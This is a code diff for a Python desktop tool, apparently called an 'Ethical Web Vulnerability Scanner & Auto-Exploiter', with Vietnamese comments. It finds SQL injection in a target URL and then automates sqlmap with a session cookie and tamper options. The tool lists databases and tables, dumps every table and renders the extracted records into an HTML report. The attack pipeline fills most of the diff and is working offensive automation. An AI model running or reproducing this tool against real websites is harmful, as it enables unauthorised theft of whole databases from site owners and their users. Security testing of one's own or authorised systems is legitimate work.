@@ -8,13 +8,21 @@ import getpass
 import csv
 import shutil
 from datetime import datetime
-from PyQt5.QtWidgets import QMessageBox, QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, QLineEdit, QPushButton, QTextEdit, QProgressBar, QLabel, QTreeWidget, QTreeWidgetItem
-from PyQt5.QtCore import QObject, QThread, pyqtSignal
+
+from PyQt5.QtWidgets import (
+    QMessageBox, QApplication, QMainWindow, QWidget, QVBoxLayout, 
+    QHBoxLayout, QLineEdit, QPushButton, QTextEdit, QProgressBar, 
+    QLabel, QTreeWidget, QTreeWidgetItem, QSplitter
+)
+from PyQt5.QtCore import QObject, QThread, pyqtSignal, Qt
 from urllib.parse import urlparse, parse_qs, urlencode
+
+# Import các module core
 from core.scanner import ScannerWorker
+from core.exploiter import UnionExploiter
 from reporting.generator import generate_report
 
-# Lớp Worker để chạy sqlmap, không cần thay đổi
+# --- WORKER 1: CHẠY SQLMAP ---
 class AttackOrchestratorWorker(QObject):
     log_received = pyqtSignal(str)
     database_found = pyqtSignal(str)
@@ -35,184 +43,239 @@ class AttackOrchestratorWorker(QObject):
             )
             for line in iter(self.process.stdout.readline, ''):
                 if self._is_stopped: break
-                self.log_received.emit(line.strip())
-                yield line.strip()
-            self.process.stdout.close(); self.process.wait()
+                clean_line = line.strip()
+                if clean_line:
+                    self.log_received.emit(clean_line)
+                    yield clean_line
+            self.process.stdout.close()
+            self.process.wait()
         except Exception as e:
-            self.log_received.emit(f"\n[ERROR] Failed to run command: {e}")
+            self.log_received.emit(f"\n[ERROR] Failed: {e}")
 
     def run(self):
-        dumped_data = {}
+        # 1. Cấu hình cơ bản (KHÔNG để các tham số -D, -T, --dump ở đây)
         method = self.vuln_data.get("method", "GET")
-        base_command_options = "--batch --tamper=space2comment"
-        base_command = ""
+        base_opts = "--batch --tamper=space2comment --threads=10 --time-sec=1 --common-columns --hex --fresh-queries"
         
+        target = f"-u \"{self.vuln_data['url']}\""
         if method == "POST":
-            target_url = self.vuln_data['url']; data_string = urlencode(self.vuln_data.get('data', {}))
-            base_command = f"sqlmap -u \"{target_url}\" --data=\"{data_string}\" -p \"{self.vuln_data['parameter']}\" {base_command_options}"
-        else:
-            clean_url = self.vuln_data.get('clean_url', self.vuln_data['url'])
-            base_command = f"sqlmap -u \"{clean_url}\" -p \"{self.vuln_data['parameter']}\" {base_command_options}"
+            data_str = urlencode(self.vuln_data.get('data', {}))
+            target = f"-u \"{self.vuln_data['url']}\" --data=\"{data_str}\" -p \"{self.vuln_data['parameter']}\""
         
-        # NÂNG CẤP: Thêm cookie vào lệnh sqlmap nếu có
-        if self.vuln_data.get("cookie"):
-            base_command += f" --cookie=\"{self.vuln_data['cookie']}\""
+        cookie = f" --cookie=\"{self.vuln_data['cookie']}\"" if self.vuln_data.get("cookie") else ""
+        
+        # Lệnh gốc để tái sử dụng
+        cmd_root = f"sqlmap {target} {cookie} {base_opts}"
 
-        # ... (Phần còn lại của hàm run giữ nguyên y hệt phiên bản hoạt động tốt)
+        # --- STEP 1: DATABASES ---
         self.log_received.emit("\n" + "="*20 + " STEP 1: FETCHING DATABASES " + "="*20)
-        dbs_command = f"{base_command} --dbs"
-        found_databases = []
-        parsing_dbs = False
-        for line in self._run_command(dbs_command):
-            if "available databases" in line: parsing_dbs = True; continue
-            if parsing_dbs and line.startswith('[*]'):
-                db_name = line[4:].strip()
-                if db_name and db_name not in ['information_schema', 'performance_schema', 'mysql', 'sys']:
-                    found_databases.append(db_name); self.database_found.emit(db_name)
-        
-        for db in found_databases:
-            self.log_received.emit("\n" + "="*20 + f" STEP 2: FETCHING TABLES FOR '{db}' " + "="*20)
-            tables_command = f"{base_command} -D {db} --tables"
-            found_tables = []
-            parsing_tables = False
-            for line in self._run_command(tables_command):
-                if line.strip().startswith('+---'): parsing_tables = not parsing_tables; continue
-                if parsing_tables and line.strip().startswith('|'):
-                    parts = [p.strip() for p in line.strip().strip('|').split('|')]
-                    if parts and parts[0]: found_tables.append(parts[0])
+        found_dbs = []
+        for line in self._run_command(f"{cmd_root} --dbs"):
+            if line.startswith('[*]') and not any(x in line for x in ['schema', 'mysql', 'sys', 'ending @']):
+                db = line[4:].strip()
+                found_dbs.append(db)
+                self.database_found.emit(db)
+
+        # --- STEP 2: TABLES ---
+        for db in found_dbs:
+            self.log_received.emit("\n" + "="*20 + f" STEP 2: TABLES FOR {db} " + "="*20)
+            tables = []
+            parsing = False
+            for line in self._run_command(f"{cmd_root} -D \"{db}\" --tables"):
+                if line.strip().startswith('+---'): parsing = not parsing; continue
+                if parsing and '|' in line:
+                    table = line.split('|')[1].strip()
+                    if table.lower() != "table": tables.append(table)
             
-            if found_tables: self.tables_found.emit(db, found_tables)
-            dumped_data[db] = {}
+            if tables:
+                self.tables_found.emit(db, tables)
+                
+                # --- STEP 3: DUMP DATA (QUAN TRỌNG NHẤT) ---
+                for t in tables:
+                    self.log_received.emit("\n" + "-"*20 + f" STEP 3: DUMPING {db}.{t} " + "-"*20)
+                    # Lệnh dump phải đầy đủ -D và -T
+                    dump_cmd = f"{cmd_root} -D \"{db}\" -T \"{t}\" --dump --no-cast"
+                    for _ in self._run_command(dump_cmd): pass
 
-            for table in found_tables:
-                self.log_received.emit("\n" + "-"*20 + f" STEP 3: DUMPING RECORDS FROM '{db}.{table}' " + "-"*20)
-                dump_command = f"{base_command} -D {db} -T {table} --dump"
-                headers, records = [], []
-                parsing_dump = False
-                for line in self._run_command(dump_command):
-                    if "dumped to CSV file" in line: break
-                    if line.strip().startswith('+---'): parsing_dump = not parsing_dump; continue
-                    if parsing_dump and line.strip().startswith('|'):
-                        parts = [p.strip() for p in line.strip().strip('|').split('|')]
-                        if not headers: headers = parts
-                        else: records.append(parts)
-                dumped_data[db][table] = {'headers': headers, 'records': records}
-        self.process_finished.emit(dumped_data)
+        self.process_finished.emit({})
 
-    def stop(self): self._is_stopped = True; # ... (Logic stop process)
+    def stop(self):
+        self._is_stopped = True
+        if self.process:
+            self.process.terminate()
 
+# --- CHƯƠNG TRÌNH CHÍNH ---
 class MainWindow(QMainWindow):
     def __init__(self):
         super().__init__()
-        self.setWindowTitle("Ethical Web Vulnerability Scanner")
-        self.setGeometry(100, 100, 900, 800)
+        self.setWindowTitle("Ethical Web Vulnerability Scanner & Auto-Exploiter")
+        self.setGeometry(100, 100, 1000, 900)
+        
+        self.vulnerabilities = []
+        self.db_tree_items = {}
+        self.scanner_thread = None
+        self.attack_thread = None
+        
+        self.init_ui()
+
+    def init_ui(self):
         central_widget = QWidget()
         self.setCentralWidget(central_widget)
         main_layout = QVBoxLayout(central_widget)
+
+        # 1. Input Group (URL & Cookie)
+        input_card = QWidget()
+        input_card.setStyleSheet("background-color: #f8f9fa; border: 1px solid #dee2e6; border-radius: 5px;")
+        input_layout = QVBoxLayout(input_card)
         
-        # --- GIAO DIỆN MỚI VỚI Ô NHẬP COOKIE ---
-        input_group = QVBoxLayout()
         self.url_input = QLineEdit()
-        self.url_input.setPlaceholderText("Enter Base URL (e.g., http://localhost:8003/)")
+        self.url_input.setPlaceholderText("Target URL: http://localhost/qlthoitrang/?frame=chitietsp&id=31")
         self.cookie_input = QLineEdit()
-        self.cookie_input.setPlaceholderText("Paste Cookie here (e.g., PHPSESSID=abc123def456)")
-        input_group.addWidget(QLabel("Target URL:"))
-        input_group.addWidget(self.url_input)
-        input_group.addWidget(QLabel("Authentication Cookie (Optional):"))
-        input_group.addWidget(self.cookie_input)
+        self.cookie_input.setPlaceholderText("Cookie: PHPSESSID=abc123def...")
         
-        control_layout = QHBoxLayout()
-        control_layout.addLayout(input_group)
-        self.scan_button = QPushButton("Start Scan")
-        control_layout.addWidget(self.scan_button)
-        main_layout.addLayout(control_layout)
-        # --- KẾT THÚC THAY ĐỔI GIAO DIỆN ---
+        input_layout.addWidget(QLabel("Target URL:"))
+        input_layout.addWidget(self.url_input)
+        input_layout.addWidget(QLabel("Authentication Cookie (Optional):"))
+        input_layout.addWidget(self.cookie_input)
         
+        self.scan_button = QPushButton("🚀 Start Security Scan")
+        self.scan_button.setStyleSheet("background-color: #007bff; color: white; font-weight: bold; height: 40px;")
+        self.scan_button.clicked.connect(self.start_scan)
+        input_layout.addWidget(self.scan_button)
+        
+        main_layout.addWidget(input_card)
+        self.url_input.setStyleSheet("""
+            QLineEdit {
+                background-color: white;
+                color: black;
+                border: 1px solid #ced4da;
+                padding: 6px;
+                border-radius: 4px;
+            }
+        """)
+
+        self.cookie_input.setStyleSheet("""
+            QLineEdit {
+                background-color: white;
+                color: black;
+                border: 1px solid #ced4da;
+                padding: 6px;
+                border-radius: 4px;
+            }
+        """)
+
+
+        # 2. Progress Bar
         self.progress_bar = QProgressBar()
         main_layout.addWidget(self.progress_bar)
-        
-        main_layout.addWidget(QLabel("Scan & Crawl Log:"))
-        self.log_output = QTextEdit()
-        self.log_output.setReadOnly(True)
-        self.log_output.setFixedHeight(150)
-        main_layout.addWidget(self.log_output)
-        
-        main_layout.addWidget(QLabel("Vulnerability Scan Results:"))
+
+        # 3. Log & Results (Sử dụng Splitter)
+        splitter = QSplitter(Qt.Vertical)
+
+        # Kết quả quét
+        res_widget = QWidget()
+        res_layout = QVBoxLayout(res_widget)
+        res_layout.addWidget(QLabel("Vulnerability Scan Results:"))
         self.results_tree = QTreeWidget()
         self.results_tree.setHeaderLabels(["Vulnerability Type", "URL", "Parameter"])
-        self.results_tree.setFixedHeight(150)
-        main_layout.addWidget(self.results_tree)
+        self.results_tree.setFixedHeight(180)
+        self.results_tree.itemSelectionChanged.connect(self.on_item_selection_changed)
+        res_layout.addWidget(self.results_tree)
         
-        attack_layout = QHBoxLayout()
-        self.attack_button = QPushButton("Dump All Data to HTML Report")
+        btn_layout = QHBoxLayout()
+        self.attack_button = QPushButton("🔥 Dump Data (sqlmap)")
         self.attack_button.setEnabled(False)
-        self.report_button = QPushButton("Generate Scan Report")
+        self.report_button = QPushButton("📄 Generate Scan Report")
         self.report_button.setEnabled(False)
-        attack_layout.addWidget(self.attack_button); attack_layout.addWidget(self.report_button)
-        main_layout.addLayout(attack_layout)
+        btn_layout.addWidget(self.attack_button)
+        btn_layout.addWidget(self.report_button)
+        res_layout.addLayout(btn_layout)
+        
+        splitter.addWidget(res_widget)
 
-        main_layout.addWidget(QLabel("Discovered Database Structure (In-Progress):"))
+        # Cấu trúc Database & Log tấn công
+        bottom_widget = QWidget()
+        bottom_layout = QHBoxLayout(bottom_widget)
+        
+        # Cây DB
+        db_box = QVBoxLayout()
+        db_box.addWidget(QLabel("Discovered Database Structure:"))
         self.db_structure_tree = QTreeWidget()
         self.db_structure_tree.setHeaderLabels(["Databases & Tables"])
-        self.db_structure_tree.setFixedHeight(200)
-        main_layout.addWidget(self.db_structure_tree)
-
-        main_layout.addWidget(QLabel("Attack Process Log:"))
+        db_box.addWidget(self.db_structure_tree)
+        bottom_layout.addLayout(db_box, 1)
+        
+        # Log Output
+        log_box = QVBoxLayout()
+        log_box.addWidget(QLabel("Attack Process Log:"))
         self.attack_output = QTextEdit()
         self.attack_output.setReadOnly(True)
-        self.attack_output.setStyleSheet("background-color: #2b2b2b; color: #a9b7c6; font-family: 'Courier New';")
-        main_layout.addWidget(self.attack_output)
+        self.attack_output.setStyleSheet("background-color: #1e1e1e; color: #00ff00; font-family: 'Consolas';")
+        log_box.addWidget(self.attack_output)
+        bottom_layout.addLayout(log_box, 2)
+        
+        splitter.addWidget(bottom_widget)
+        main_layout.addWidget(splitter)
 
-        self.vulnerabilities = []; self.db_tree_items = {}
-        self.scanner_thread, self.scanner_worker = None, None
-        self.attack_thread, self.attack_worker = None, None
-
-        self.scan_button.clicked.connect(self.start_scan)
+        # Connect signals
         self.attack_button.clicked.connect(self.start_attack)
         self.report_button.clicked.connect(self.generate_scan_report)
-        self.results_tree.itemSelectionChanged.connect(self.on_item_selection_changed)
 
+    # --- HÀM XỬ LÝ QUÉT ---
     def start_scan(self):
         base_url = self.url_input.text()
-        cookie = self.cookie_input.text() # Lấy cookie từ giao diện
-        if not base_url: self.log_output.append("Please enter a base URL."); return
+        cookie = self.cookie_input.text()
+        if not base_url: return
 
-        self.scan_button.setEnabled(False); self.report_button.setEnabled(False); self.attack_button.setEnabled(False)
-        self.log_output.clear(); self.results_tree.clear(); self.attack_output.clear(); self.progress_bar.setValue(0)
+        self.scan_button.setEnabled(False)
+        self.results_tree.clear()
+        self.attack_output.clear()
+        self.progress_bar.setValue(0)
         
-        self.scanner_thread = QThread(self)
-        self.scanner_worker = ScannerWorker(base_url, cookie) # Truyền cookie vào worker
-        if not hasattr(self.scanner_worker, 'stop'): self.scanner_worker.stop = lambda: None
+        self.scanner_thread = QThread()
+        self.scanner_worker = ScannerWorker(base_url, cookie)
         self.scanner_worker.moveToThread(self.scanner_thread)
+        
         self.scanner_thread.started.connect(self.scanner_worker.run_scan)
-        self.scanner_worker.log_updated.connect(self.update_log)
-        self.scanner_worker.progress_updated.connect(self.update_progress)
+        self.scanner_worker.log_updated.connect(lambda msg: self.attack_output.append(msg))
+        self.scanner_worker.progress_updated.connect(lambda c, t: self.progress_bar.setValue(int(c/t*100)))
         self.scanner_worker.scan_finished.connect(self.scan_done)
+        
         self.scanner_thread.start()
 
+    def scan_done(self, vulnerabilities):
+        self.vulnerabilities = vulnerabilities
+        self.display_results()
+        self.scanner_thread.quit()
+        self.scan_button.setEnabled(True)
+        if vulnerabilities: self.report_button.setEnabled(True)
+
+    def display_results(self):
+        self.results_tree.clear()
+        for vuln in self.vulnerabilities:
+            self.results_tree.addTopLevelItem(QTreeWidgetItem([vuln['type'], vuln['url'], vuln['parameter']]))
+        for i in range(3): self.results_tree.resizeColumnToContents(i)
+
+    # --- HÀM XỬ LÝ TẤN CÔNG ---
+    def on_item_selection_changed(self):
+        selected = self.results_tree.selectedItems()
+        is_sqli = selected and "SQLi" in selected[0].text(0)
+        self.attack_button.setEnabled(is_sqli)
+
     def start_attack(self):
-        selected_items = self.results_tree.selectedItems()
-        if not selected_items: return
+        selected = self.results_tree.selectedItems()
+        if not selected: return
         
-        selected_url, selected_param = selected_items[0].text(1), selected_items[0].text(2)
-        vuln_data = next((v for v in self.vulnerabilities if v['url'] == selected_url and v['parameter'] == selected_param), None)
+        vuln_data = next((v for v in self.vulnerabilities if v['url'] == selected[0].text(1) and v['parameter'] == selected[0].text(2)), None)
         if not vuln_data: return
 
-        # NÂNG CẤP: Truyền cookie vào worker tấn công
         vuln_data['cookie'] = self.cookie_input.text()
+        self.attack_button.setEnabled(False)
+        self.attack_output.clear()
+        self.db_structure_tree.clear()
+        self.db_tree_items = {}
 
-        self.attack_button.setEnabled(False); self.scan_button.setEnabled(False)
-        self.attack_output.clear(); self.db_structure_tree.clear(); self.db_tree_items = {}
-
-        if vuln_data.get("method", "GET") == "GET":
-            parsed = urlparse(vuln_data['url'])
-            params = parse_qs(parsed.query)
-            if vuln_data['parameter'] in params:
-                 params[vuln_data['parameter']][0] = params[vuln_data['parameter']][0].replace(vuln_data['payload'], '')
-            clean_query = urlencode(params, doseq=True)
-            vuln_data['clean_url'] = parsed._replace(query=clean_query).geturl()
-
-        self.attack_thread = QThread(self)
+        self.attack_thread = QThread()
         self.attack_worker = AttackOrchestratorWorker(vuln_data)
         self.attack_worker.moveToThread(self.attack_thread)
 
@@ -221,8 +284,9 @@ class MainWindow(QMainWindow):
         self.attack_worker.database_found.connect(self.add_database_to_tree)
         self.attack_worker.tables_found.connect(self.add_tables_to_db_node)
         self.attack_worker.process_finished.connect(self.attack_finished)
-        self.attack_thread.start()
         
+        self.attack_thread.start()
+
     def add_database_to_tree(self, db_name):
         item = QTreeWidgetItem([db_name])
         self.db_structure_tree.addTopLevelItem(item)
@@ -230,150 +294,100 @@ class MainWindow(QMainWindow):
 
     def add_tables_to_db_node(self, db_name, tables):
         if db_name in self.db_tree_items:
-            parent_item = self.db_tree_items[db_name]
-            for table_name in tables:
-                child_item = QTreeWidgetItem([table_name])
-                parent_item.addChild(child_item)
-            parent_item.setExpanded(True)
+            parent = self.db_tree_items[db_name]
+            for t in tables: parent.addChild(QTreeWidgetItem([t]))
+            parent.setExpanded(True)
 
-    def attack_finished(self, dumped_data):
-        self.update_attack_output("\n[*] Attack orchestration complete.")
-        self.attack_thread.quit(); self.attack_thread.wait()
-        self.attack_button.setEnabled(True); self.scan_button.setEnabled(True)
-
-        # === FIX: ĐỌC FILE CSV TỪ SQLMAP OUTPUT ===
-        import getpass
-        user = getpass.getuser()
-        dump_path = f"/home/{user}/.local/share/sqlmap/output/localhost/dump"
-
-        if not os.path.exists(dump_path):
-                self.update_attack_output(f"[!] Không tìm thấy thư mục dump: {dump_path}")
-                QMessageBox.information(self, "Dump Result", "Không tìm thấy dữ liệu dump.")
-                return
-
-        html_data = {}
+    def attack_finished(self, _):
+        self.update_attack_output("\n[*] SQLMap hoàn tất. Đang tìm file CSV...")
+        self.attack_thread.quit()
+        
+        # Đường dẫn gốc chứa toàn bộ output
+        output_base = os.path.expanduser("~/.local/share/sqlmap/output")
+        self.all_dumped_data = {}
         has_data = False
 
-        for db_dir in os.listdir(dump_path):
-                db_path = os.path.join(dump_path, db_dir)
-                if not os.path.isdir(db_path): 
-                        continue
+        if not os.path.exists(output_base):
+            self.update_attack_output("[!] Không thấy thư mục output của SQLMap.")
+            return
 
-                html_data[db_dir] = {}
-                for csv_file in glob.glob(os.path.join(db_path, "*.csv")):
+        # Quét tất cả các folder (localhost, 127.0.0.1, ...)
+        for target_dir in os.listdir(output_base):
+            dump_path = os.path.join(output_base, target_dir, "dump")
+            if not os.path.exists(dump_path): continue
+
+            for db_name in os.listdir(dump_path):
+                db_dir = os.path.join(dump_path, db_name)
+                if os.path.isdir(db_dir):
+                    if db_name not in self.all_dumped_data: self.all_dumped_data[db_name] = {}
+                    
+                    for csv_file in glob.glob(os.path.join(db_dir, "*.csv")):
                         table_name = os.path.basename(csv_file).replace(".csv", "")
-                        headers = []
-                        records = []
                         try:
-                                with open(csv_file, 'r', encoding='utf-8') as f:
-                                        reader = csv.reader(f)
-                                        for i, row in enumerate(reader):
-                                                row = [cell.strip() for cell in row]
-                                                if i == 0:
-                                                        headers = row
-                                                elif row and len(row) > 1 and not row[0].startswith('+'):
-                                                        records.append(row)
-                                if records:
-                                        has_data = True
-                                html_data[db_dir][table_name] = {'headers': headers, 'records': records}
-                        except Exception as e:
-                                self.update_attack_output(f"[!] Lỗi đọc file {csv_file}: {e}")
+                            with open(csv_file, 'r', encoding='utf-8') as f:
+                                reader = csv.reader(f)
+                                rows = list(reader)
+                                if rows:
+                                    self.all_dumped_data[db_name][table_name] = {
+                                        'headers': rows[0],
+                                        'records': rows[1:]
+                                    }
+                                    has_data = True
+                        except: continue
 
-        if not has_data:
-                self.update_attack_output("[!] Không có dữ liệu nào được dump.")
-                QMessageBox.information(self, "Dump Result", "Không có dữ liệu nào được dump.")
+        if has_data:
+            self.update_attack_output("[+] Đã tải dữ liệu thành công. Đang tạo báo cáo...")
+            self.generate_scan_report()
         else:
-                self.update_attack_output("[*] Đang tạo báo cáo HTML...")
-                self.generate_html_report(html_data)
-        
-        shutil.rmtree(dump_path, ignore_errors=True)
-        self.update_attack_output("[*] Đã dọn dẹp file dump.")
+            self.update_attack_output("[!] SQLMap không dump được bản ghi nào. Hãy kiểm tra xem bảng có dữ liệu không.")
 
     def generate_html_report(self, data):
         timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
         filename = f"dump_report_{timestamp}.html"
         
-        css = """<style>body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;background-color:#f4f4f9;color:#333;margin:0;padding:20px}h1,h2,h3{color:#2c3e50;border-bottom:2px solid #3498db;padding-bottom:10px}h1{font-size:2.5em;text-align:center}h2{font-size:2em;margin-top:40px}h3{font-size:1.5em;margin-top:30px;color:#2980b9;border-bottom:none}table{width:100%;border-collapse:collapse;margin-top:20px;box-shadow:0 2px 5px rgba(0,0,0,.1);background-color:#fff}th,td{padding:12px 15px;text-align:left;border-bottom:1px solid #ddd}thead tr{background-color:#3498db;color:#fff}tbody tr:nth-of-type(even){background-color:#f8f9fa}tbody tr:hover{background-color:#ecf0f1}.container{max-width:1200px;margin:auto}.footer{text-align:center;margin-top:50px;font-size:.9em;color:#777}</style>"""
-        html = f"<html><head><title>SQLi Dump Report</title>{css}</head><body><div class='container'><h1>SQL Injection Data Dump Report</h1>"
+        css = "<style>body{font-family:sans-serif; background:#f4f4f9; padding:20px} table{width:100%; border-collapse:collapse; background:#fff; margin-bottom:30px} th,td{border:1px solid #ddd; padding:10px; text-align:left} th{background:#3498db; color:white} h2{color:#2c3e50; border-bottom:2px solid #3498db}</style>"
+        html = f"<html><head><title>SQLi Report</title>{css}</head><body><h1>SQL Injection Data Dump</h1>"
         
         for db, tables in data.items():
-            html += f"<h2>Database: <code>{db}</code></h2>"
-            if not tables: html += "<p>No tables found in this database.</p>"; continue
-            for table, content in tables.items():
-                html += f"<h3>Table: <code>{table}</code></h3>"
-                if not content.get('headers') or not content.get('records'):
-                    html += "<p>No records found or could not parse data for this table.</p>"; continue
-                html += "<table><thead><tr>"
-                for header in content['headers']: html += f"<th>{header}</th>"
+            html += f"<h2>Database: {db}</h2>"
+            for t, content in tables.items():
+                html += f"<h3>Table: {t}</h3><table><thead><tr>"
+                for h in content['headers']: html += f"<th>{h}</th>"
                 html += "</tr></thead><tbody>"
-                for record in content['records']:
-                    html += "<tr>"
-                    for i in range(len(content['headers'])):
-                        cell = record[i] if i < len(record) else ""
-                        html += f"<td>{cell}</td>"
-                    html += "</tr>"
+                for r in content['records']:
+                    html += "<tr>" + "".join(f"<td>{cell}</td>" for cell in r) + "</tr>"
                 html += "</tbody></table>"
-        html += f"<div class='footer'><p>Report generated by Ethical Scanner on {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p></div></div></body></html>"
+        html += "</body></html>"
         
         with open(filename, 'w', encoding='utf-8') as f: f.write(html)
-        
-        self.update_attack_output(f"[*] Report saved as {filename}")
-        webbrowser.open_new_tab(f"file://{os.path.realpath(filename)}")
+        self.update_attack_output(f"[*] Report saved: {filename}")
+        webbrowser.open(f"file://{os.path.realpath(filename)}")
 
-    def closeEvent(self, event):
-        is_thread_running = False
-        if self.scanner_thread and self.scanner_thread.isRunning(): is_thread_running = True
-        if self.attack_thread and self.attack_thread.isRunning(): is_thread_running = True
-        if is_thread_running:
-            reply = QMessageBox.question(self, 'Exit Confirmation', "A process is running. Are you sure you want to exit?", QMessageBox.Yes | QMessageBox.No, QMessageBox.No)
-            if reply == QMessageBox.Yes:
-                if hasattr(self, 'scanner_worker') and self.scanner_worker and hasattr(self.scanner_worker, 'stop'): self.scanner_worker.stop()
-                if hasattr(self, 'attack_worker') and self.attack_worker: self.attack_worker.stop()
-                event.accept()
-            else:
-                event.ignore()
-        else:
-            event.accept()
-            
-    def on_item_selection_changed(self):
-        selected_items = self.results_tree.selectedItems()
-        is_sqli = selected_items and "SQLi" in selected_items[0].text(0)
-        self.attack_button.setEnabled(is_sqli)
-    
     def update_attack_output(self, line): self.attack_output.append(line)
     
-    def start_scan(self):
-        base_url = self.url_input.text()
-        if not base_url: self.log_output.append("Please enter a base URL."); return
-        self.scan_button.setEnabled(False); self.report_button.setEnabled(False); self.attack_button.setEnabled(False)
-        self.log_output.clear(); self.results_tree.clear(); self.attack_output.clear(); self.progress_bar.setValue(0)
-        
-        self.scanner_thread = QThread(self)
-        self.scanner_worker = ScannerWorker(base_url)
-        if not hasattr(self.scanner_worker, 'stop'): self.scanner_worker.stop = lambda: None
-        self.scanner_worker.moveToThread(self.scanner_thread)
-        self.scanner_thread.started.connect(self.scanner_worker.run_scan); self.scanner_worker.log_updated.connect(self.update_log); self.scanner_worker.progress_updated.connect(self.update_progress); self.scanner_worker.scan_finished.connect(self.scan_done)
-        self.scanner_thread.start()
-
-    def update_log(self, message): self.log_output.append(message)
-    
-    def update_progress(self, current, total):
-        if total > 0: self.progress_bar.setValue(int((current / total) * 100))
-
-    def scan_done(self, vulnerabilities):
-        self.vulnerabilities = vulnerabilities; self.display_results(); self.scanner_thread.quit(); self.scanner_thread.wait(); self.scan_button.setEnabled(True)
-        if self.vulnerabilities: self.report_button.setEnabled(True)
-
-    def display_results(self):
-        self.results_tree.clear()
-        for vuln in self.vulnerabilities: self.results_tree.addTopLevelItem(QTreeWidgetItem([vuln['type'], vuln['url'], vuln['parameter']]))
-        for i in range(3): self.results_tree.resizeColumnToContents(i)
-
     def generate_scan_report(self):
-        if not self.vulnerabilities: self.log_output.append("No vulnerabilities to report."); return
+        if not self.vulnerabilities:
+            QMessageBox.warning(self, "Warning", "No vulnerabilities to report.")
+            return
+            
         base_url = self.url_input.text()
-        report_filename = generate_report(base_url, self.vulnerabilities)
-        self.log_output.append(f"Report generated: {report_filename}")
+        
+        # Lấy dữ liệu đã dump được từ biến tạm (nếu có)
+        # Biến này nên được gán trong hàm attack_finished
+        dump_data = getattr(self, 'all_dumped_data', None)
+        
+        # Gọi generator mới
+        filename = generate_report(base_url, self.vulnerabilities, dump_data)
+        
+        self.attack_output.append(f"\n[+] Full HTML report generated: {filename}")
+        webbrowser.open(f"file://{os.path.abspath(filename)}")
+
+    def closeEvent(self, event):
+        if (self.scanner_thread and self.scanner_thread.isRunning()) or (self.attack_thread and self.attack_thread.isRunning()):
+            if QMessageBox.question(self, "Exit", "A process is running. Exit?", QMessageBox.Yes|QMessageBox.No) == QMessageBox.Yes:
+                event.accept()
+            else: event.ignore()
+        else: event.accept()
 
 if __name__ == "__main__":
     app = QApplication(sys.argv)
